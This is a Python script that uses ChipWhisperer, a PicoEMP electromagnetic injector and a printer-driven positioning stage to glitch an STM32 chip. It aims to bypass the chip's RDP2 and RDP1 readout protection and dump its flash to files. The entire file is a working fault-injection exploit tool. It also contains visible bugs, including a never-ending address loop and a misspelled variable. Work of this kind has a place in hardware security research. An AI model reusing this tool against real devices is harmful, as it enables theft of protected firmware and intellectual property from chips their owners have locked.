import os
import subprocess
import chipwhisperer.common.results.glitch as glitch
import sys
import chipwhisperer as cw
import time
import serial
from stm32bl import *
from picoemp import *
import logging

scope = cw.scope()

# RDP2 Settings
RDP2_XMIN = 184.6
RDP2_XMAX = 184.6
RDP2_YMIN = 86.8
RDP2_YMAX = 86.8
RDP2_BP_START=7800
RDP2_BP_END=7825
RDP2_Z_OFFSET = 20.8
RDP2_TRIES = 1

# RDP1 Settings
RDP1_BP_START=400
RDP1_BP_END=600
RDP1_Z_OFFSET_START = 20.7
RDP1_Z_OFFSET_END = 20.6
RDP1_TRIES = 10

# create logger
#logger = logging.getLogger('GDBG')
#logger.setLevel(logging.DEBUG)

logFormatter = logging.Formatter("%(asctime)s [%(threadName)-12.12s] [%(levelname)-5.5s]  %(message)s")
rootLogger = logging.getLogger("GDBG")
fileHandler = logging.FileHandler(f"{time.time()}_{RDP2_XMIN}_{RDP2_XMAX}_{RDP2_YMIN}_{RDP2_YMAX}_{RDP2_BP_START}_{RDP2_BP_END}_{RDP2_Z_OFFSET}_{RDP1_BP_START}_{RDP1_BP_END}_{RDP1_Z_OFFSET_START}_{RDP1_Z_OFFSET_END}.glitchlog")
fileHandler.setFormatter(logFormatter)
rootLogger.addHandler(fileHandler)
consoleHandler = logging.StreamHandler()
consoleHandler.setFormatter(logFormatter)
rootLogger.addHandler(consoleHandler)
rootLogger.setLevel(logging.DEBUG)
# create console handler and set level to debug
rootLogger.debug("Glitch DBG Logs")
rootLogger.debug(f"{time.time()}_{RDP2_XMIN}_{RDP2_XMAX}_{RDP2_YMIN}_{RDP2_YMAX}_{RDP2_BP_START}_{RDP2_BP_END}_{RDP2_Z_OFFSET}_{RDP1_BP_START}_{RDP1_BP_END}_{RDP1_Z_OFFSET_START}_{RDP1_Z_OFFSET_END}")


def detect_bootloader(attempts=1):
    response = send_command(BootloaderCommand(0x7F))
    while response != b'\x79':
        response = send_command(BootloaderCommand(0x7F))
        attempts -= 1
        if attempts == 0:
            return False
    return True

def reboot_flush():            
    scope.io.target_pwr = False
    time.sleep(.1)
    scope.arm()
    scope.io.target_pwr = True


def configure_reset_trigger():
    scope.reset_fpga()
    scope.default_setup()
    time.sleep(.1)
    scope.glitch.enabled = True   
    try:
        scope.clock.clkgen_freq = 30e6
        scope.glitch.clk_src = "pll"
    except ValueError as noresp:
        pass
    while not scope.glitch.mmcm_locked:
        scope.reset_fpga()
        scope.default_setup()
        scope.glitch.resetDCMs(keepPhase=False)
        scope.glitch.enabled = True   
        try:
            scope.clock.clkgen_freq = 30e6
            scope.glitch.clk_src = "pll"
        except ValueError as asinine:
            pass
        time.sleep(.1)
        pass
    scope.trigger.triggers = "tio4"
    scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
    scope.glitch.output = "enable_only" # glitch_out = clk ^ glitch
    scope.glitch.repeat = 500
    scope.glitch.width = 40
    scope.glitch.offset = -45
    scope.io.glitch_trig_mcx = 'glitch'
    scope.io.hs2 = "glitch"


def configure_edge_trigger():
    #scope.reset_fpga()
    #scope.default_setup()
    time.sleep(.1)
    scope.glitch.enabled = True
    try:
        scope.clock.clkgen_freq = 30e6
        scope.glitch.clk_src = "pll"
    except ValueError as noresp:
        pass
    while not scope.glitch.mmcm_locked:
        #scope.reset_fpga()
        #scope.default_setup()
        scope.glitch.resetDCMs(keepPhase=False)
        scope.glitch.enabled = True   
        try:
            scope.clock.clkgen_freq = 30e6
            scope.glitch.clk_src = "pll"
        except ValueError as asinine:
            pass
        time.sleep(.1)
        pass
    scope.trigger.module = 'edge_counter'
    scope.trigger.triggers = "tio1"
    scope.trigger.edges = 11
    scope.io.glitch_trig_mcx = 'glitch'
    scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called
    scope.glitch.output = "enable_only" # glitch_out = clk ^ glitch
    scope.glitch.repeat = 500
    scope.glitch.width = 40
    scope.glitch.offset = -45
    scope.io.hs2 = "glitch"


PICO="/dev/serial/by-id/usb-Raspberry_Pi_Pico_E661640843604326-if00"
PRINTER="/dev/serial/by-id/usb-1a86_USB_Serial-if00-port0"
baud_rate = 115200  # Set the baud rate to match your STM32 bootloader configuration
timeout = 1  # Set the timeout value as needed
print_cntrl = serial.Serial(PRINTER,baud_rate,timeout=timeout)

def soft_reset():
    scope.io.nrst = False  
    time.sleep(.05)
    scope.io.nrst = 'high_z'

# Set up PicoEMP
pico = ChipShouterPicoEMP(PICO)
pico.setup_external_control()
pico.arm()

# Configure RDP2 to RDP1 parameters
RDP2_GC = cw.GlitchController(groups=["success", "normal"], parameters=["ext_offset","x","y","tries"])
RDP2_GC.set_global_step([1])
RDP2_GC.set_range("tries",1,RDP2_TRIES)
RDP2_GC.set_range("ext_offset", RDP2_BP_START,RDP2_BP_END) # error, list too short
RDP2_GC.set_range("x",RDP2_XMIN,RDP2_XMAX)
RDP2_GC.set_range("y",RDP2_YMIN,RDP2_YMAX)
RDP2_GC.set_step("x", [.1]) # eqv to [10, 10, 10]
RDP2_GC.set_step("y", [.1]) # eqv to [10, 10, 10]

# Configure RDP1 bypass parameters
RDP1_GC = cw.GlitchController(groups=["success","normal"],parameters=["ext_offset","tries"])
RDP1_GC.set_global_step([1])
RDP1_GC.set_range("tries",1,RDP1_TRIES)
RDP1_GC.set_range("ext_offset",RDP1_BP_START,RDP1_BP_END)

# Set up Chipwhisperer and disable errors
scope.adc.lo_gain_errors_disabled = True
scope.adc.clip_errors_disabled = True

# An ext offset of 100, places us about 5us _after_ the last pulse of our serial message
# If we are assuming about 18-20us of response time between then we shold have an ext offset from 100-600

current_addr = 0x8000000
total_size = 1024*256

def RDP1_Bypass():
    # Soft reset
    PAGE_READ = False
    while current_addr <= current_addr + total_size:
        for glitch_setting in RDP1_GC.glitch_values():
            tries = glitch_setting[1]
            soft_reset()
            x = detect_bootloader(attempts=2)
            if not x:
                RDP2_Bypass()
                configure_edge_trigger()
            print_cntrl.write(f"G0 Z{RDP1_Z_OFFSET_START}\r\n".encode())
            scope.glitch.ext_offset = glitch_setting[0]
            scope.io.glitch_hp = False
            scope.io.glitch_hp = True
            scope.io.glitch_lp = False
            scope.io.glitch_lp = True
            pico.arm()
            scope.capture()
            scope.arm()
            test = read_memory(current_addr,0xFF,scope)
            if test != None:
                if len(test) >= 0xF0:
                    rootLogger.debug(f"Page READ @ {current_addr} = {glitch_setting[0]}")
                    rootLogger.debug(f"Ext Offset = {glitch_setting[0]}")
                    with open(f"{current_addr}.bin",'wb') as ofile:
                        ofile.write(test)
                    curent_addr += 0x100
                    if current_addr == current_addr+total_size:
                        rootLogger.debug(f"Flash read complete! Total time: {time.time() - start_time}")
                        sys.exit()
'''
Bypass the RDP check in the bootloader, allowing for the MCU to boot into UART bootloader mode
'''
def RDP2_Bypass():
    configure_reset_trigger()
    BL_MODE = False
    while BL_MODE == False:
        for glitch_setting in RDP2_GC.glitch_values():
            scope.glitch.ext_offset = glitch_setting[0]
            x_coord = glitch_setting[1]
            y_coord = glitch_setting[2]
            tries = glitch_setting[3]
            print_cntrl.write(f"G0 X{x_coord} Y{y_coord} Z{RDP2_Z_OFFSET}\r\n".encode())
            scope.io.glitch_hp = False
            scope.io.glitch_hp = True
            scope.io.glitch_lp = False
            scope.io.glitch_lp = True
            pico.arm()
            reboot_flush()    
            time.sleep(.3)
            foo = detect_bootloader(attempts=2)
            if foo:
                rootLogger.debug(f"RDP2_RDP1 X: {x_coord} - Y: {y_coord} Offset: {scope.glitch.ext_offset}")
                BL_MODE = True
    return BL_MODE

start_time = time.time()
RDP1_Bypass()